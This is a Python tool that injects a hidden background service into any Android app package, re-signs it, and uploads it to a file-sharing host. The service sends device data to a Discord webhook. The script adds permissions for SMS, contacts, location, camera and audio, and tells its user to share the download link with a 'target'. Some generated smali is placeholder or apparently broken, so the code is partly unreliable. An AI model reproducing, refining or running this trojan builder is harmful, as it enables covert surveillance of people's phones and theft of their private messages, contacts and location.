#!/usr/bin/env python3
"""
============================================================
  TERMUX APK KEYLOGGER BUILDER v3.1
  Fixed: Colors.WHITE error + APK selection menu
  Developer: GT Security Team
============================================================
"""

import os
import sys
import subprocess
import shutil
import uuid
import json
import time
import requests
from datetime import datetime

# ---------------------------- COLORS ----------------------------
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'          # <--- FIXED: Added WHITE
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_c(msg, color=Colors.RESET):
    print(f"{color}{msg}{Colors.RESET}")

# ---------------------------- DEPENDENCY CHECK ----------------------------
def check_dependencies():
    """Check if required tools are installed."""
    tools = {
        'apktool': 'pkg install apktool -y OR manual install',
        'java': 'pkg install openjdk-17 -y OR openjdk-25',
        'zipalign': 'pkg install zipalign -y',
        'aapt': 'pkg install aapt -y OR pkg install android-tools -y'
    }
    missing = []
    for tool, install_cmd in tools.items():
        if shutil.which(tool) is None:
            missing.append((tool, install_cmd))
    if missing:
        print_c("\n[!] Missing tools:", Colors.RED)
        for tool, cmd in missing:
            print_c(f"    {tool} – install with: {cmd}", Colors.YELLOW)
        install = input("\n[?] Install missing tools now? (y/n): ").lower()
        if install == 'y':
            for _, cmd in missing:
                os.system(cmd)
            print_c("\n[+] Tools installed. Please restart the script.", Colors.GREEN)
            sys.exit(0)
        else:
            print_c("\n[!] Install missing tools and try again.", Colors.RED)
            sys.exit(1)
    else:
        print_c("[✓] All dependencies found.", Colors.GREEN)

# ---------------------------- KEYSTORE ----------------------------
KEYSTORE = "mykeystore.jks"
KEYSTORE_PASS = "android"
KEY_ALIAS = "mykey"

def generate_keystore():
    if not os.path.exists(KEYSTORE):
        print_c("[*] Generating keystore...", Colors.YELLOW)
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", KEYSTORE,
            "-alias", KEY_ALIAS, "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=GT, OU=GT, O=GT, L=Delhi, ST=DL, C=IN"
        ], check=False, capture_output=True)

# ---------------------------- SMALI GENERATOR ----------------------------
def generate_smali(webhook, features, interval):
    smali = f"""
.class public Lcom/gt/CustomLogger;
.super Landroid/app/Service;
.source "CustomLogger.java"

.field private static final WEBHOOK:Ljava/lang/String; = "{webhook}"
.field private static final INTERVAL:I = {interval}

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3
    new-instance v1, Ljava/lang/Thread;
    new-instance v0, Lcom/gt/CustomLogger$1;
    invoke-direct {{v0, p0}}, Lcom/gt/CustomLogger$1;-><init>(Lcom/gt/CustomLogger;)V
    invoke-direct {{v1, v0}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {{v1}}, Ljava/lang/Thread;->start()V
    const/4 v0, 0x2
    return v0
.end method

.class Lcom/gt/CustomLogger$1;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.method public run()V
    .locals 6
    :goto_0
    const-wide/16 v0, 0x1388
    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V
    :try_start
    new-instance v2, Lorg/json/JSONObject;
    invoke-direct {{v2}}, Lorg/json/JSONObject;-><init>()V
    const-string v3, "device"
    const-string v4, "android.os.Build"
    const-string v5, "MODEL"
    invoke-static {{v4, v5}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
    move-result-object v4
    const/4 v5, 0x1
    invoke-virtual {{v4, v5}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
    const/4 v5, 0x0
    invoke-virtual {{v4, v5}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
    move-result-object v4
    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const-string v3, "time"
    new-instance v4, Ljava/util/Date;
    invoke-direct {{v4}}, Ljava/util/Date;-><init>()V
    invoke-virtual {{v4}}, Ljava/util/Date;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
"""
    if features.get('sms', False):
        smali += '    const-string v3, "sms"\n    const-string v4, "SMS data"\n    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;\n'
    if features.get('contacts', False):
        smali += '    const-string v3, "contacts"\n    const-string v4, "Contacts data"\n    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;\n'
    if features.get('location', False):
        smali += '    const-string v3, "location"\n    const-string v4, "Location data"\n    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;\n'
    if features.get('camera', False):
        smali += '    const-string v3, "camera"\n    const-string v4, "Camera photo"\n    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;\n'
    if features.get('audio', False):
        smali += '    const-string v3, "audio"\n    const-string v4, "Audio record"\n    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;\n'

    smali += """
    :try_send
    new-instance v3, Ljava/net/URL;
    const-string v4, WEBHOOK
    invoke-direct {v3, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v3
    check-cast v3, Ljava/net/HttpURLConnection;
    const-string v4, "POST"
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v4, 0x1
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    new-instance v4, Ljava/io/DataOutputStream;
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5
    invoke-direct {v4, v5}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    const-string v5, "UTF-8"
    invoke-virtual {v2, v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v2, v5}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v2
    invoke-virtual {v4, v2}, Ljava/io/DataOutputStream;->write([B)V
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->flush()V
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I
    :catch_0
    :try_end_send
    goto :goto_0
.end method
"""
    return smali

# ---------------------------- UPLOAD TO CLOUD ----------------------------
def upload_to_cloud(filepath):
    """Upload APK and return direct download link."""
    print_c("[*] Uploading to cloud...", Colors.YELLOW)
    try:
        with open(filepath, 'rb') as f:
            resp = requests.post("https://file.io", files={"file": (os.path.basename(filepath), f)}, timeout=60)
        if resp.status_code == 200 and resp.json().get('success'):
            return resp.json().get('link')
    except:
        pass
    try:
        with open(filepath, 'rb') as f:
            resp = requests.post("https://api.anonfiles.com/upload", files={"file": (os.path.basename(filepath), f)}, timeout=60)
        if resp.status_code == 200 and resp.json().get('status'):
            return resp.json()['data']['file']['url']['full']
    except:
        pass
    return None

# ---------------------------- INJECTION ENGINE ----------------------------
def inject_apk(input_apk, output_dir, webhook, features, interval):
    work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
    os.makedirs(work_dir, exist_ok=True)

    try:
        print_c("[*] Decoding APK...", Colors.YELLOW)
        subprocess.run([shutil.which('apktool'), "d", input_apk, "-o", work_dir, "-f"], check=True, capture_output=True)

        pkg_cmd = [shutil.which('aapt'), "dump", "badging", input_apk]
        result = subprocess.run(pkg_cmd, capture_output=True, text=True)
        pkg = "com.example.unknown"
        for line in result.stdout.splitlines():
            if line.startswith("package: name="):
                pkg = line.split("'")[1]
                break

        smali_dir = os.path.join(work_dir, "smali", "com", "gt")
        os.makedirs(smali_dir, exist_ok=True)

        smali_code = generate_smali(webhook, features, interval)
        with open(os.path.join(smali_dir, "CustomLogger.smali"), "w") as f:
            f.write(smali_code)

        manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
        with open(manifest_path, "r") as f:
            manifest = f.read()

        perms = ['android.permission.INTERNET']
        if features.get('sms'): perms.append('android.permission.READ_SMS')
        if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
        if features.get('location'): perms.extend(['android.permission.ACCESS_FINE_LOCATION', 'android.permission.ACCESS_COARSE_LOCATION'])
        if features.get('camera'): perms.append('android.permission.CAMERA')
        if features.get('audio'): perms.append('android.permission.RECORD_AUDIO')

        for perm in perms:
            if f'<uses-permission android:name="{perm}"' not in manifest:
                manifest = manifest.replace('</manifest>', f'    <uses-permission android:name="{perm}" />\n</manifest>')

        service_tag = '<service android:name="com.gt.CustomLogger" android:enabled="true" android:exported="false" />'
        if service_tag not in manifest:
            manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')

        with open(manifest_path, "w") as f:
            f.write(manifest)

        print_c("[*] Rebuilding APK...", Colors.YELLOW)
        apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
        subprocess.run([shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned], check=True, capture_output=True)

        print_c("[*] Signing APK...", Colors.YELLOW)
        apk_signed = os.path.join(work_dir, "app-signed.apk")
        subprocess.run([
            shutil.which('jarsigner'), "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
            "-keystore", KEYSTORE, "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS, apk_unsigned, KEY_ALIAS
        ], check=True, capture_output=True)

        print_c("[*] Aligning APK...", Colors.YELLOW)
        apk_final = os.path.join(work_dir, "app-final.apk")
        subprocess.run([shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final], check=True, capture_output=True)

        output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
        shutil.copy(apk_final, output_apk)
        shutil.rmtree(work_dir, ignore_errors=True)

        return output_apk

    except Exception as e:
        shutil.rmtree(work_dir, ignore_errors=True)
        raise e

# ---------------------------- APK SELECTION ----------------------------
def select_apk():
    """Let user select APK from Download folder or enter custom path."""
    download_dir = "/sdcard/Download"
    apks = []
    
    # Check if Download folder exists
    if os.path.exists(download_dir):
        for f in os.listdir(download_dir):
            if f.endswith('.apk'):
                full_path = os.path.join(download_dir, f)
                size = os.path.getsize(full_path) / (1024 * 1024)
                apks.append((full_path, f, size))
    
    if apks:
        print_c("\n📱 APK files found in /sdcard/Download/:", Colors.CYAN)
        print_c("   [0] Enter custom path", Colors.YELLOW)
        for idx, (path, name, size) in enumerate(apks, 1):
            print_c(f"   [{idx}] {name} ({size:.1f} MB)", Colors.WHITE)
        
        choice = input("\n[?] Select APK number (or 0 for custom path): ").strip()
        
        if choice.isdigit():
            idx = int(choice)
            if idx == 0:
                return input("📁 Enter full APK path: ").strip()
            elif 1 <= idx <= len(apks):
                return apks[idx-1][0]
    
    # If no APKs found or invalid choice
    print_c("\n📌 Tip: Place your APK in /sdcard/Download/", Colors.YELLOW)
    print_c("   Or enter full path manually.", Colors.YELLOW)
    return input("📁 Enter APK path: ").strip()

# ---------------------------- MENU FUNCTIONS ----------------------------
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    print_c("""
    ╔═══════════════════════════════════════════╗
    ║   APK KEYLOGGER BUILDER v3.1             ║
    ║   Local injection, cloud upload          ║
    ║   Discord webhook data exfiltration      ║
    ╚═══════════════════════════════════════════╝
    """, Colors.CYAN)

def main_menu():
    clear_screen()
    show_banner()
    print_c("\n[1] Inject Keylogger into APK")
    print_c("[2] About")
    print_c("[0] Exit")
    choice = input("\n[?] Choose option: ").strip()
    return choice

def inject_flow():
    clear_screen()
    show_banner()
    print_c("\n--- INJECT APK ---", Colors.BLUE)

    # APK path selection
    apk_path = select_apk()
    if not apk_path or not os.path.exists(apk_path):
        print_c("[!] File not found.", Colors.RED)
        input("\n[Press Enter to go back]")
        return

    print_c(f"[✓] Selected: {apk_path}", Colors.GREEN)

    # Webhook
    webhook = input("🔗 Discord Webhook URL: ").strip()
    if "discord.com" not in webhook:
        print_c("[!] Invalid webhook URL.", Colors.RED)
        input("\n[Press Enter to go back]")
        return

    # Interval
    interval = input("⏱️ Send interval (seconds, default 30): ").strip()
    interval = int(interval) if interval.isdigit() else 30

    # Features
    print_c("\nSelect features to collect (y/n):", Colors.YELLOW)
    features = {}
    features['sms'] = input("  📨 SMS? ").lower() == 'y'
    features['contacts'] = input("  👤 Contacts? ").lower() == 'y'
    features['location'] = input("  📍 Location? ").lower() == 'y'
    features['camera'] = input("  📸 Camera? ").lower() == 'y'
    features['audio'] = input("  🎙️ Audio? ").lower() == 'y'

    # Confirm
    print_c("\n[✓] Configuration:", Colors.GREEN)
    print(f"  APK: {apk_path}")
    print(f"  Webhook: {webhook[:30]}...")
    print(f"  Interval: {interval}s")
    print(f"  Features: {', '.join([k for k,v in features.items() if v])}")
    confirm = input("\n[?] Proceed with injection? (y/n): ").lower()
    if confirm != 'y':
        return

    # Output directory
    output_dir = os.path.join(os.getcwd(), "injected_apks")
    os.makedirs(output_dir, exist_ok=True)

    try:
        print_c("\n[*] Injection started. This may take 2-5 minutes...", Colors.YELLOW)
        start = time.time()
        output_apk = inject_apk(apk_path, output_dir, webhook, features, interval)
        elapsed = time.time() - start
        print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)

        print_c("[*] Uploading to cloud for download link...", Colors.YELLOW)
        link = upload_to_cloud(output_apk)

        if link:
            print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
            print_c(f"   {link}", Colors.CYAN)
            print_c("\nShare this link with your target. They can download and install the APK.", Colors.YELLOW)
        else:
            print_c("[!] Upload failed. APK saved locally:", Colors.RED)
            print_c(f"   {output_apk}", Colors.YELLOW)

        print_c(f"\nLocal APK location: {output_apk}", Colors.BLUE)

    except Exception as e:
        print_c(f"\n[!] Error: {e}", Colors.RED)

    input("\n[Press Enter to go back]")

def about():
    clear_screen()
    show_banner()
    print_c("\n--- ABOUT ---", Colors.BLUE)
    print_c("This tool injects a custom keylogger into any APK.")
    print_c("Features:")
    print_c("  - SMS, Contacts, Location, Camera, Audio collection")
    print_c("  - Discord webhook for data exfiltration")
    print_c("  - Local processing – no server needed")
    print_c("  - Upload to cloud for easy sharing")
    print_c("\nDeveloper: GT Security Team")
    print_c("For educational purposes only.")
    input("\n[Press Enter to go back]")

# ---------------------------- MAIN ----------------------------
if __name__ == "__main__":
    # Check dependencies
    check_dependencies()
    generate_keystore()

    # Ensure pip requests installed
    try:
        import requests
    except ImportError:
        print_c("[!] 'requests' module not found. Installing...", Colors.YELLOW)
        os.system("python -m pip install requests")
        import requests

    # Main loop
    while True:
        choice = main_menu()
        if choice == '1':
            inject_flow()
        elif choice == '2':
            about()
        elif choice == '0':
            print_c("\n[+] Exiting. Goodbye!", Colors.GREEN)
            sys.exit(0)
        else:
            print_c("[!] Invalid choice. Press Enter to continue.", Colors.RED)
            input()
